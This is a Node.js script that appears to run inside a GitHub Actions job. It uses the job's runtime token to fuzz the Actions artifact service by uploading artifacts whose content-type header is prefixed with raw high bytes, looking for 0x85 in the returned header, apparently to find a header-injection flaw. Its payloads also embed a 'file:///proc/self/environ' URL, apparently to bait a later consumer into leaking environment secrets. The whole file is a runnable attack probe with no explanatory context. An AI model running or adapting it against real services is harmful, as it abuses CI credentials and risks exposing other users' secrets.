'use strict';

const crypto = require('node:crypto');

const SERVICE = '/twirp/github.actions.results.api.v1.ArtifactService/';

function context() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
  const scope = payload.scp.split(' ').find((value) => value.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  return { token, base, runId, jobId };
}

async function rpc(ctx, method, fields) {
  const response = await fetch(ctx.base + SERVICE + method, {
    method: 'POST',
    headers: { Authorization: `Bearer ${ctx.token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      workflow_run_backend_id: ctx.runId,
      workflow_job_run_backend_id: ctx.jobId,
      ...fields,
    }),
  });
  return { status: response.status, body: await response.json().catch(() => ({})) };
}

async function one(ctx, byte) {
  const label = byte.toString(16).padStart(2, '0');
  const name = `ct-${label}.json`;
  const payload = Buffer.from(`{"full_name":"sweep/${label}","owner":{"login":"p","avatar_url":"file:///proc/self/environ"}}`);
  const created = await rpc(ctx, 'CreateArtifact', {
    name,
    version: 7,
    mime_type: 'application/json',
  });
  const uploadUrl = created.body.signed_upload_url || created.body.signedUploadUrl;
  if (!uploadUrl) return { byte: label, stage: 'create', status: created.status };
  let uploaded;
  try {
    uploaded = await fetch(uploadUrl, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/octet-stream',
        'x-ms-blob-content-type': String.fromCharCode(byte) + 'application/json',
        'x-ms-blob-type': 'BlockBlob',
      },
      body: payload,
    });
  } catch (error) {
    return { byte: label, stage: 'upload', error: error.message };
  }
  const finalized = await rpc(ctx, 'FinalizeArtifact', {
    name,
    size: String(payload.length),
    hash: `sha256:${crypto.createHash('sha256').update(payload).digest('hex')}`,
  });
  const signed = await rpc(ctx, 'GetSignedArtifactURL', { name });
  const downloadUrl = signed.body.signed_url || signed.body.signedUrl;
  if (!downloadUrl) {
    return { byte: label, stage: 'signed', upload: uploaded.status, finalize: finalized.status,
      status: signed.status };
  }
  const response = await fetch(downloadUrl, { headers: { 'x-ms-version': '2009-09-19' } });
  const value = response.headers.get('content-type') || '';
  return {
    byte: label,
    upload: uploaded.status,
    finalize: finalized.status,
    download: response.status,
    contentTypeHex: Buffer.from(value, 'latin1').toString('hex'),
  };
}

(async () => {
  const ctx = context();
  const bytes = Array.from({ length: 128 }, (_, index) => index + 0x80);
  let cursor = 0;
  const results = [];
  async function worker() {
    while (cursor < bytes.length) {
      const byte = bytes[cursor];
      cursor += 1;
      const result = await one(ctx, byte);
      results.push(result);
      console.log('SWEEP ' + JSON.stringify(result));
    }
  }
  await Promise.all(Array.from({ length: 6 }, worker));
  const target = results.filter((result) => result.contentTypeHex &&
    (result.contentTypeHex.startsWith('85') || result.contentTypeHex.endsWith('85')));
  console.log('TARGETS ' + JSON.stringify(target));
})().catch((error) => {
  console.error(error && error.stack || error);
  process.exitCode = 1;
});
